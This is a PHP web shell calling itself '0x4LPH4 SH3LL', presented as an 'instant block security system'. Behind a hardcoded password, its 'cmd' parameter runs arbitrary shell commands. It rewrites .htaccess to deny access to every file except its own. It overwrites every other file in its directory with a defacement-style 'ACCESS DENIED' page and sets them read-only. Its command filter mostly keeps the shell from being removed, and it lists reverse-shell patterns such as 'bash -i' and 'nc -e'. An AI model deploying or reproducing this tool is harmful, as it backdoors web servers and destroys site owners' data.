<?php
// ============= INSTANT BLOCK SECURITY SYSTEM BY 0X4LPH4 =============
session_start();

// Disable error reporting for production
error_reporting(0);
ini_set('display_errors', 0);

// Configuration
define('SESSION_TIMEOUT', 1800);
define('DEFAULT_PASSWORD', 'GeoDevz69#');
define('SCRIPT_NAME', basename(__FILE__));
define('ALLOWED_USER', '0x4LPH4');
define('ALLOWED_FILES', ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html']);
define('BLOCK_EXTENSIONS', ['php', 'html', 'htm', 'txt', 'js', 'css', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'xml', 'json']);
define('SCAN_INTERVAL', 30); // Seconds between scans (30 seconds para hindi laggy)

// Initialize session data if not set
if (!isset($_SESSION['login_time'])) {
    $_SESSION['login_time'] = time();
    $_SESSION['last_activity'] = time();
    $_SESSION['last_scan_time'] = 0;
}

// Check session timeout
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
    session_unset();
    session_destroy();
    session_start();
    $_SESSION['authenticated'] = false;
    $_SESSION['login_time'] = time();
    $_SESSION['last_activity'] = time();
    $_SESSION['last_scan_time'] = 0;
} else {
    $_SESSION['last_activity'] = time();
}

// Initialize protection BEFORE login check
initializeProtection();

// Handle blocked file requests FIRST
if (isset($_GET['blocked'])) {
    $blockedFile = basename($_GET['blocked']);
    $filePath = getAbsolutePath($_GET['blocked']);
    
    // Block file if exists and not allowed (REGARDLESS of path)
    if (file_exists($filePath) && !isFilenameAllowed($blockedFile)) {
        instantBlockFile($filePath);
    }
    
    // Show blocking page
    showBlockedPage($blockedFile);
    exit;
}

// Login check
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    showLogin();
    exit;
}

// ============= PROTECTION FUNCTIONS =============
function initializeProtection() {
    // Create .htaccess if doesn't exist
    createHtaccessProtection();
    
    // Run instant scan on initialization
    instantScanFiles();
}

function getAbsolutePath($filename) {
    $currentDir = dirname(__FILE__);
    $serverRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
    
    // Remove any query string or fragments
    $filename = preg_replace('/[?#].*$/', '', $filename);
    
    // Handle absolute paths
    if (strpos($filename, '/') === 0) {
        // Absolute path from document root
        return $serverRoot . $filename;
    } elseif (strpos($filename, '../') !== false || strpos($filename, './') === 0) {
        // Relative path - resolve it
        $path = realpath($currentDir . '/' . $filename);
        return $path ?: $currentDir . '/' . basename($filename);
    } else {
        // Simple filename in current directory
        return $currentDir . '/' . $filename;
    }
}

function createHtaccessProtection() {
    $currentDir = dirname(__FILE__);
    $scriptName = basename(__FILE__);
    $htaccessFile = $currentDir . '/.htaccess';
    
    // Only create/update if needed
    $currentContent = @file_get_contents($htaccessFile);
    $expectedMarker = "INSTANT PROTECTION";
    
    if ($currentContent && strpos($currentContent, $expectedMarker) !== false) {
        return; // Already configured
    }
    
    $htaccessContent = "# ============= " . ALLOWED_USER . " INSTANT PROTECTION =============\n";
    $htaccessContent .= "Options -Indexes\n";
    $htaccessContent .= "RewriteEngine On\n";
    $htaccessContent .= "RewriteBase /\n\n";
    
    // Block ALL files except allowed ones
    $htaccessContent .= "# Block ALL files except allowed ones\n";
    $htaccessContent .= "RewriteCond %{REQUEST_FILENAME} -f\n";
    $htaccessContent .= "RewriteCond %{REQUEST_URI} !^/(0x4[lL]ph4\.(php|html|txt)|index\.(php|html)|" . preg_quote($scriptName) . ")$ [NC]\n";
    $htaccessContent .= "RewriteRule .* " . $scriptName . "?blocked=%{REQUEST_URI} [L,QSA]\n\n";
    
    // Force PHP execution for blocked files
    $htaccessContent .= "<FilesMatch \"\\.(" . implode('|', BLOCK_EXTENSIONS) . ")$\">\n";
    $htaccessContent .= "    SetHandler application/x-httpd-php\n";
    $htaccessContent .= "</FilesMatch>\n\n";
    
    // Default deny for all
    $htaccessContent .= "Order Deny,Allow\n";
    $htaccessContent .= "Deny from all\n\n";
    
    // Allow only specific files
    $allowedFiles = ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html', SCRIPT_NAME];
    foreach ($allowedFiles as $file) {
        $htaccessContent .= "<Files \"" . $file . "\">\n";
        $htaccessContent .= "    Allow from all\n";
        $htaccessContent .= "</Files>\n\n";
    }
    
    @file_put_contents($htaccessFile, $htaccessContent);
}

// Function to check if filename is allowed (case-insensitive)
function isFilenameAllowed($filename) {
    $basename = basename($filename);
    $basenameLower = strtolower($basename);
    
    $allowedFiles = array_map('strtolower', array_merge(
        ALLOWED_FILES,
        [SCRIPT_NAME]
    ));
    
    // Check exact match (case-insensitive)
    if (in_array($basenameLower, $allowedFiles)) {
        return true;
    }
    
    // Check if it's one of our protected files (already blocked)
    // ONLY check if file contains blocking content
    if (file_exists($filename)) {
        $content = @file_get_contents($filename, false, null, 0, 200);
        if ($content && strpos($content, 'INSTANTLY BLOCKED BY') !== false) {
            return true; // Already blocked, treat as "allowed" for checking purposes
        }
    }
    
    return false;
}

// SIMPLE INSTANT file blocking - ALWAYS block if not allowed
function instantBlockFile($filePath) {
    if (!file_exists($filePath) || is_dir($filePath)) {
        return false;
    }
    
    $filename = basename($filePath);
    $filenameLower = strtolower($filename);
    
    // First, check if file is allowed - if YES, DON'T BLOCK
    $allowedFiles = array_map('strtolower', array_merge(
        ALLOWED_FILES,
        [SCRIPT_NAME]
    ));
    
    if (in_array($filenameLower, $allowedFiles)) {
        return false; // Don't block allowed files
    }
    
    // Check if already blocked
    $content = @file_get_contents($filePath, false, null, 0, 200);
    if ($content && strpos($content, 'INSTANTLY BLOCKED BY') !== false) {
        return true; // Already blocked
    }
    
    // Get original file info before blocking
    $fileInfo = @stat($filePath);
    $originalSize = $fileInfo ? $fileInfo['size'] : 0;
    $originalMtime = $fileInfo ? date('Y-m-d H:i:s', $fileInfo['mtime']) : 'Unknown';
    
    // Create blocking content
    $blockContent = "<?php\n";
    $blockContent .= "// ============= INSTANTLY BLOCKED BY " . ALLOWED_USER . " SECURITY =============\n";
    $blockContent .= "// File: " . htmlspecialchars($filename) . "\n";
    $blockContent .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
    $blockContent .= "// Path: " . htmlspecialchars($filePath) . "\n";
    $blockContent .= "// Original Size: " . $originalSize . " bytes\n";
    $blockContent .= "// Original Modified: " . $originalMtime . "\n";
    $blockContent .= "// IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN') . "\n";
    $blockContent .= "// For Security System Purpose Only\n";
    $blockContent .= "http_response_code(403);\n";
    $blockContent .= "?><!DOCTYPE html>\n";
    $blockContent .= "<html>\n<head>\n";
    $blockContent .= "    <title>ACCESS DENIED - " . ALLOWED_USER . " SECURITY</title>\n";
    $blockContent .= "    <meta charset=\"UTF-8\">\n";
    $blockContent .= "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
    $blockContent .= "    <style>\n";
    $blockContent .= "        body { \n";
    $blockContent .= "            background: #e8ecf1; \n";
    $blockContent .= "            color: #333; \n";
    $blockContent .= "            font-family: 'Segoe UI', system-ui, sans-serif; \n";
    $blockContent .= "            display: flex; \n";
    $blockContent .= "            justify-content: center; \n";
    $blockContent .= "            align-items: center; \n";
    $blockContent .= "            min-height: 100vh; \n";
    $blockContent .= "            margin: 0; \n";
    $blockContent .= "            padding: 20px; \n";
    $blockContent .= "        }\n";
    $blockContent .= "        .security-card { \n";
    $blockContent .= "            width: 400px; \n";
    $blockContent .= "            background: #f0f4f8; \n";
    $blockContent .= "            border-radius: 25px; \n";
    $blockContent .= "            padding: 35px; \n";
    $blockContent .= "            box-shadow: 10px 10px 20px #cacfd8, -10px -10px 20px #ffffff; \n";
    $blockContent .= "            text-align: center; \n";
    $blockContent .= "        }\n";
    $blockContent .= "        h1 { \n";
    $blockContent .= "            color: #e74c3c; \n";
    $blockContent .= "            margin: 0 0 15px 0; \n";
    $blockContent .= "            font-size: 22px; \n";
    $blockContent .= "        }\n";
    $blockContent .= "        .details { \n";
    $blockContent .= "            background: #e8ecf1; \n";
    $blockContent .= "            padding: 15px; \n";
    $blockContent .= "            border-radius: 12px; \n";
    $blockContent .= "            margin: 15px 0; \n";
    $blockContent .= "            text-align: left; \n";
    $blockContent .= "        }\n";
    $blockContent .= "        .security-badge { \n";
    $blockContent .= "            background: #3498db; \n";
    $blockContent .= "            color: white; \n";
    $blockContent .= "            padding: 8px 20px; \n";
    $blockContent .= "            border-radius: 18px; \n";
    $blockContent .= "            font-weight: 600; \n";
    $blockContent .= "            margin-top: 15px; \n";
    $blockContent .= "            display: inline-block; \n";
    $blockContent .= "        }\n";
    $blockContent .= "    </style>\n";
    $blockContent .= "</head>\n<body>\n";
    $blockContent .= "    <div class=\"security-card\">\n";
    $blockContent .= "        <h1>💢 ACCESS DENIED 💢</h1>\n";
    $blockContent .= "        <p><strong>-==[ " . ALLOWED_USER . " SECURITY WAS HERE ]==-</strong></p>\n";
    $blockContent .= "        <div class=\"details\">\n";
    $blockContent .= "            <p><strong>File:</strong> " . htmlspecialchars($filename) . "</p>\n";
    $blockContent .= "            <p><strong>Time:</strong> " . date('Y-m-d H:i:s') . "</p>\n";
    $blockContent .= "            <p><strong>Path:</strong> " . htmlspecialchars(dirname($filePath)) . "</p>\n";
    $blockContent .= "            <p><strong>Reason:</strong> Unauthorized file secured</p>\n";
    $blockContent .= "        </div>\n";
    $blockContent .= "        <div class=\"security-badge\">🔐 Oopss!!! Websites Protected 🔐</div>\n";
    $blockContent .= "    </div>\n";
    $blockContent .= "</body>\n</html>\n";
    $blockContent .= "<?php exit(); ?>";

    // Write and protect file
    $result = @file_put_contents($filePath, $blockContent);
    if ($result !== false) {
        @chmod($filePath, 0444); // Read-only
        return true;
    }
    
    return false;
}

// SIMPLE SCANNER - current directory only (for performance)
function instantScanFiles() {
    $currentDir = dirname(__FILE__);
    $blocked = 0;
    
    // Get list of files in current directory
    $files = @scandir($currentDir);
    if (!$files) return 0;
    
    foreach ($files as $file) {
        if ($file === '.' || $file === '..' || $file === '.htaccess') continue;
        
        $filePath = $currentDir . '/' . $file;
        
        if (is_dir($filePath)) {
            continue; // Skip directories for now
        }
        
        // SIMPLE CHECK: If filename is NOT allowed, BLOCK IT
        $filenameLower = strtolower($file);
        $allowedFiles = array_map('strtolower', array_merge(
            ALLOWED_FILES,
            [SCRIPT_NAME]
        ));
        
        if (!in_array($filenameLower, $allowedFiles)) {
            // Block the file (regardless of extension)
            if (instantBlockFile($filePath)) {
                $blocked++;
            }
        }
    }
    
    return $blocked;
}

// Show blocked page
function showBlockedPage($filename) {
    http_response_code(403);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>ACCESS DENIED - <?php echo ALLOWED_USER; ?> SECURITY SYSTEM</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { 
                background: #e8ecf1; 
                color: #333; 
                font-family: 'Segoe UI', system-ui, sans-serif; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                margin: 0; 
                padding: 20px; 
            }
            .security-card { 
                width: 400px; 
                background: #f0f4f8; 
                border-radius: 25px; 
                padding: 35px; 
                box-shadow: 10px 10px 20px #cacfd8, -10px -10px 20px #ffffff; 
                text-align: center; 
            }
            h1 { 
                color: #e74c3c; 
                margin: 0 0 15px 0; 
                font-size: 22px; 
            }
            .details { 
                background: #e8ecf1; 
                padding: 15px; 
                border-radius: 12px; 
                margin: 15px 0; 
                text-align: left; 
            }
            .security-badge { 
                background: #3498db; 
                color: white; 
                padding: 8px 20px; 
                border-radius: 18px; 
                font-weight: 600; 
                margin-top: 15px; 
                display: inline-block; 
            }
        </style>
    </head>
    <body>
        <div class="security-card">
            <h1>🚫 ACCESS DENIED</h1>
            <p><strong><?php echo ALLOWED_USER; ?> SECURITY SYSTEM</strong></p>
            <div class="details">
                <p><strong>File:</strong> <?php echo htmlspecialchars($filename); ?></p>
                <p><strong>Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                <p><strong>IP:</strong> <?php echo $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'; ?></p>
                <p><strong>Path:</strong> <?php echo htmlspecialchars($_SERVER['REQUEST_URI'] ?? ''); ?></p>
                <p><strong>Reason:</strong> For Security System Purpose Only</p>
            </div>
            <div class="security-badge">🔐 Oopss!!! Websites Protected 🔐</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Run instant scan only if needed (every 30 seconds to prevent lag)
$instantBlockCount = 0;
$lastScanTime = $_SESSION['last_scan_time'] ?? 0;
$currentTime = time();

// Always scan on first load or if enough time has passed
if ($currentTime - $lastScanTime >= SCAN_INTERVAL) {
    $instantBlockCount = instantScanFiles();
    $_SESSION['last_scan_time'] = $currentTime;
}

// Process command execution
$commandOutput = '';
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['cmd'])) {
    $command = trim($_GET['cmd']);
    
    if (!empty($command)) {
        if (isDangerousCommand($command)) {
            $commandOutput = "Command blocked by " . ALLOWED_USER . " Security System\n";
            $commandOutput .= "Reason: Potentially dangerous command detected\n";
        } else {
            set_time_limit(10);
            $output = [];
            $return_var = 0;
            
            @exec($command . ' 2>&1', $output, $return_var);
            
            if (!empty($output)) {
                $commandOutput = "Command: " . htmlspecialchars($command) . "\n";
                $commandOutput .= "Output:\n" . str_repeat("-", 70) . "\n";
                
                foreach ($output as $line) {
                    $cleanLine = rtrim($line);
                    $cleanLine = preg_replace('/\s+/', ' ', $cleanLine);
                    $commandOutput .= htmlspecialchars($cleanLine) . "\n";
                }
                
                $commandOutput .= str_repeat("-", 70) . "\n";
                $commandOutput .= "Exit code: " . $return_var . "\n";
            }
            
            // Rescan after command execution
            $newBlocks = instantScanFiles();
            if ($newBlocks > 0) {
                $commandOutput .= "\n[SECURITY] " . $newBlocks . " files secured!\n";
            }
        }
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ============= LOGIN FUNCTION =============
function showLogin() {
    $error = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = $_POST['password'] ?? '';
        
        if ($password === DEFAULT_PASSWORD) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['last_activity'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'Invalid password!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure Login - <?php echo ALLOWED_USER; ?> SH3LL</title>
        <style>
            /* Reset and Base */
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            
            body {
                font-family: 'Segoe UI', system-ui, sans-serif;
                background: #e8ecf1;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            
            /* Login Card */
            .login-card {
                width: 380px;
                background: #f0f4f8;
                border-radius: 25px;
                padding: 35px;
                box-shadow: 10px 10px 20px #cacfd8, -10px -10px 20px #ffffff;
                text-align: center;
            }
            
            /* Logo */
            .logo-container {
                display: flex;
                justify-content: center;
                margin-bottom: 25px;
            }
            
            .logo {
                width: 80px;
                height: 80px;
                border-radius: 50%;
                background: #f0f4f8;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 10px;
                box-shadow: 
                    5px 5px 10px #cacfd8,
                    -5px -5px 10px #ffffff;
            }
            
            .logo img {
                width: 60px;
                height: 60px;
                border-radius: 50%;
                object-fit: cover;
            }
            
            /* Title */
            h2 {
                color: #2c3e50;
                font-size: 24px;
                font-weight: 700;
                margin-bottom: 8px;
            }
            
            .subtitle {
                color: #7f8c8d;
                font-size: 13px;
                margin-bottom: 25px;
            }
            
            /* Error Message */
            .error {
                background: rgba(231, 76, 60, 0.1);
                color: #e74c3c;
                padding: 12px 15px;
                border-radius: 12px;
                margin-bottom: 20px;
                font-size: 13px;
                font-weight: 600;
            }
            
            /* Form */
            .form-group {
                margin-bottom: 20px;
            }
            
            .password-wrapper {
                position: relative;
            }
            
            input[type="password"],
            input[type="text"] {
                width: 100%;
                padding: 14px 95px 14px 15px;
                background: #f0f4f8;
                border: none;
                border-radius: 12px;
                color: #2c3e50;
                font-size: 14px;
                font-weight: 500;
                box-shadow: inset 4px 4px 8px #cacfd8, inset -4px -4px 8px #ffffff;
            }
            
            input[type="password"]:focus,
            input[type="text"]:focus {
                outline: none;
            }
            
            /* Toggle Button */
            .toggle-btn {
                position: absolute;
                right: 8px;
                top: 50%;
                transform: translateY(-50%);
                background: #f0f4f8;
                border: none;
                color: #3498db;
                font-size: 11px;
                font-weight: 700;
                padding: 7px 15px;
                border-radius: 10px;
                cursor: pointer;
                text-transform: uppercase;
                box-shadow: 3px 3px 6px #cacfd8, -3px -3px 6px #ffffff;
            }
            
            /* Submit Button */
            input[type="submit"] {
                width: 100%;
                padding: 14px;
                background: #f0f4f8;
                color: #2c3e50;
                border: none;
                border-radius: 12px;
                font-size: 14px;
                font-weight: 700;
                cursor: pointer;
                text-transform: uppercase;
                box-shadow: 5px 5px 10px #cacfd8, -5px -5px 10px #ffffff;
            }
            
            /* Security Badge */
            .security-badge {
                margin-top: 20px;
                padding: 8px 20px;
                background: #3498db;
                color: white;
                border-radius: 18px;
                font-size: 11px;
                font-weight: 700;
                display: inline-block;
            }
            
            /* Responsive */
            @media (max-width: 420px) {
                .login-card {
                    width: 340px;
                    padding: 30px;
                }
            }
        </style>
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                const passwordInput = document.getElementById('password');
                const toggleBtn = document.querySelector('.toggle-btn');
                
                passwordInput.focus();
                
                toggleBtn.addEventListener('click', function() {
                    if (passwordInput.type === 'password') {
                        passwordInput.type = 'text';
                        toggleBtn.textContent = 'HIDE';
                    } else {
                        passwordInput.type = 'password';
                        toggleBtn.textContent = 'SHOW';
                    }
                });
            });
        </script>
    </head>
    <body>
        <div class="login-card">
            <div class="logo-container">
                <div class="logo">
                    <img src="https://i.ibb.co/GfwY80PT/20251208-093450.png" alt="<?php echo ALLOWED_USER; ?> Logo">
                </div>
            </div>
            
            <h2>-==[ <?php echo ALLOWED_USER; ?> SH3LL ]==-</h2>
            <div class="subtitle">Security Access Portal</div>
            
            <?php if ($error): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <form method="POST">
                <div class="form-group">
                    <div class="password-wrapper">
                        <input type="password" name="password" id="password" 
                               placeholder="Enter secure password" required autocomplete="off">
                        <button type="button" class="toggle-btn">SHOW</button>
                    </div>
                </div>
                <input type="submit" value="Login">
            </form>
            
            <div class="security-badge">Note: Strictly used an authorized Information Access.</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

function isDangerousCommand($command) {
    $command = trim($command);
    
    // Allow wget/curl only for allowed files
    if (preg_match('/^\s*(wget|curl)\s+/i', $command)) {
        if (preg_match('/-(O|o)\s+["\']?([^"\'\s]+)["\']?/i', $command, $matches)) {
            $outputFile = $matches[2];
            if (!isFilenameAllowed($outputFile)) {
                return true;
            }
        }
        return false;
    }
    
    $dangerousPatterns = [
        '/^rm\s+-(rf|fr|r|f)/i',
        '/^rm\s+.*\*.*$/i',
        '/^\s*(nmap|nikto|sqlmap|wpscan|gobuster|dirb)\s+/i',
        '/bash\s+-i\s+>/i',
        '/nc\s+.*-e\s+/i',
        '/python\s+-c\s+/i',
        '/php\s+-r\s+/i',
        '/chmod\s+[0-7]{3,4}\s+' . preg_quote(SCRIPT_NAME, '/') . '/i',
        '/rm.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
        '/mv.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
        '/cp.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
        '/unlink.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
    ];
    
    foreach ($dangerousPatterns as $pattern) {
        if (preg_match($pattern, $command)) {
            return true;
        }
    }
    
    $suspiciousKeywords = [
        'webshell', 'backdoor', 'exploit', 'inject', 'bypass', 'hack',
        'deface', 'crack', 'brute', 'ddos', 'reverse', 'shell',
        'payload', 'rootkit', 'trojan', 'virus', 'malware',
        'passwd', 'shadow', 'etc/passwd', 'proc/self',
        'kill', 'killall', 'pkill', 'chattr', 'chown',
        'chmod 777', 'chmod 755', 'wget http', 'curl http',
        ';', '&&', '||', '`', '$('
    ];
    
    foreach ($suspiciousKeywords as $keyword) {
        if (stripos($command, $keyword) !== false) {
            return true;
        }
    }
    
    return false;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo ALLOWED_USER; ?> SH3LL MANAGER</title>
    <style>
        /* Reset and Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
        }
        
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #e8ecf1;
            color: #2c3e50;
            min-height: 100vh;
            padding: 25px;
        }
        
        .container {
            width: 100%;
            max-width: 900px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        /* Card Base Style */
        .neumorphic-card {
            background: #f0f4f8;
            border-radius: 20px;
            padding: 25px;
            box-shadow: 8px 8px 16px #cacfd8, -8px -8px 16px #ffffff;
        }
        
        /* Header Card */
        .header-card {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 25px;
            min-height: 80px;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-small {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: #f0f4f8;
            padding: 5px;
            box-shadow: 3px 3px 6px #cacfd8, -3px -3px 6px #ffffff;
        }
        
        .logo-small img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            object-fit: cover;
        }
        
        .header h1 {
            font-size: 22px;
            font-weight: 700;
        }
        
        .header-controls {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .session-badge {
            background: #e8ecf1;
            padding: 8px 15px;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 600;
            color: #3498db;
        }
        
        .logout-btn {
            background: #f0f4f8;
            color: #e74c3c;
            text-decoration: none;
            padding: 8px 18px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 13px;
            box-shadow: 4px 4px 8px #cacfd8, -4px -4px 8px #ffffff;
        }
        
        /* Alert Card */
        .alert-card {
            min-height: 70px;
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 18px 25px;
        }
        
        .alert-icon {
            width: 40px;
            height: 40px;
            background: #2ecc71;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 18px;
        }
        
        /* Command Card */
        .command-card {
            min-height: 100px;
            padding: 20px 25px;
        }
        
        .command-wrapper {
            display: flex;
            gap: 12px;
        }
        
        .command-input {
            flex: 1;
            padding: 14px 20px;
            background: #e8ecf1;
            color: #2c3e50;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: inset 4px 4px 8px #cacfd8, inset -4px -4px 8px #ffffff;
        }
        
        .command-input:focus {
            outline: none;
        }
        
        .command-submit {
            background: #f0f4f8;
            color: #3498db;
            border: none;
            padding: 14px 28px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 5px 5px 10px #cacfd8, -5px -5px 10px #ffffff;
            min-width: 100px;
        }
        
        /* Output Card */
        .output-card {
            min-height: 350px;
            max-height: 500px;
            display: flex;
            flex-direction: column;
        }
        
        .output-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .output {
            background: #e8ecf1;
            padding: 20px;
            border-radius: 15px;
            flex: 1;
            overflow-y: auto;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            color: #2c3e50;
        }
        
        .output::-webkit-scrollbar {
            width: 8px;
        }
        
        .output::-webkit-scrollbar-track {
            background: #e8ecf1;
            border-radius: 10px;
        }
        
        .output::-webkit-scrollbar-thumb {
            background: #3498db;
            border-radius: 10px;
        }
        
        /* Footer Card */
        .footer-card {
            padding: 20px 25px;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
                gap: 15px;
            }
            
            .header-card {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .header-left {
                flex-direction: column;
            }
            
            .header-controls {
                flex-direction: column;
                width: 100%;
            }
            
            .command-wrapper {
                flex-direction: column;
            }
            
            .command-submit {
                width: 100%;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .neumorphic-card {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header Card -->
        <div class="neumorphic-card header-card">
            <div class="header-left">
                <div class="logo-small">
                    <img src="https://i.ibb.co/GfwY80PT/20251208-093450.png" alt="<?php echo ALLOWED_USER; ?> Logo">
                </div>
                <h1>⚡ <?php echo ALLOWED_USER; ?> MANAGER ⚡</h1>
            </div>
            <div class="header-controls">
                <div class="session-badge">
                    🕒 Session: <?php echo gmdate("H:i:s", time() - $_SESSION['login_time']); ?>
                </div>
                <a href="?logout" class="logout-btn">
                    LOGOUT
                </a>
            </div>
        </div>
        
        <!-- Alert Card -->
        <?php if ($instantBlockCount > 0): ?>
        <div class="neumorphic-card alert-card">
            <div class="alert-icon">✅</div>
            <div>
                <strong>REAL-TIME PROTECTION ACTIVE</strong><br>
                <?php echo $instantBlockCount; ?> files secured automatically
            </div>
        </div>
        <?php endif; ?>
        
        <!-- Command Card -->
        <div class="neumorphic-card command-card">
            <form method="GET" class="command-wrapper">
                <input type="text" name="cmd" class="command-input" 
                       placeholder="Enter command (e.g., ls -la, pwd, whoami)..." 
                       value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>"
                       autocomplete="off">
                <button type="submit" class="command-submit">EXECUTE</button>
            </form>
        </div>
        
        <!-- Output Card -->
        <div class="neumorphic-card output-card">
            <div class="output-header">
                <strong>SYSTEM OUTPUT</strong>
                <div class="session-badge" style="font-size: 12px;">Last Scan: <?php echo date('H:i:s'); ?></div>
            </div>
            <div class="output">
                <?php 
                if ($commandOutput) {
                    echo $commandOutput;
                } else {
                    echo "INSTANT PROTECTION SYSTEM - ACTIVE\n";
                    echo str_repeat("=", 60) . "\n\n";
                    
                    echo "📁 PROTECTION FEATURES:\n";
                    echo str_repeat("-", 60) . "\n";
                    echo "• Blocks ALL non-0x4LPH4/non-index files\n";
                    echo "• .htaccess redirect protection\n";
                    echo "• Blocks existing AND newly uploaded files\n";
                    echo "• Simple filename-based blocking\n";
                    echo "• Session-based access control\n\n";
                    
                    echo "📋 ALLOWED FILES ONLY:\n";
                    echo str_repeat("-", 60) . "\n";
                    foreach (ALLOWED_FILES as $file) {
                        echo "• " . $file . "\n";
                    }
                    echo "• " . SCRIPT_NAME . "\n\n";
                    
                    echo "🛡️ SECURITY STATUS:\n";
                    echo str_repeat("-", 60) . "\n";
                    echo "• Protection: ACTIVE\n";
                    echo "• Session: " . gmdate("H:i:s", time() - $_SESSION['login_time']) . "\n";
                    echo "• Last Scan: " . date('H:i:s') . "\n";
                    echo "• Blocked Files: " . $instantBlockCount . "\n\n";
                    
                    echo "💡 TIPS:\n";
                    echo str_repeat("-", 60) . "\n";
                    echo "• Use 'ls -la' to list files\n";
                    echo "• Use 'pwd' to show current directory\n";
                    echo "• All files except allowed ones are blocked\n";
                    echo "• Works for existing AND newly uploaded files\n";
                }
                ?>
            </div>
        </div>
        
        <!-- Footer Card -->
        <div class="neumorphic-card footer-card">
            <strong>🔐 SECURITY INFORMATION</strong>
            <p style="margin-top: 10px; font-size: 14px; color: #7f8c8d;">
                This system automatically blocks ALL non-authorized files in real-time.<br>
                Only these files are allowed: 0x4lph4.php, 0x4lph4.html, 0x4lph4.txt, index.php, index.html<br>
                All other files (existing and newly uploaded) will be blocked immediately.
            </p>
        </div>
    </div>
    
    <script>
        // Simple script - no animations to prevent lag
        document.addEventListener('DOMContentLoaded', function() {
            const outputDiv = document.querySelector('.output');
            if (outputDiv) {
                outputDiv.scrollTop = outputDiv.scrollHeight;
            }
            
            const cmdInput = document.querySelector('.command-input');
            if (cmdInput) {
                cmdInput.focus();
            }
        });
    </script>
</body>
</html>
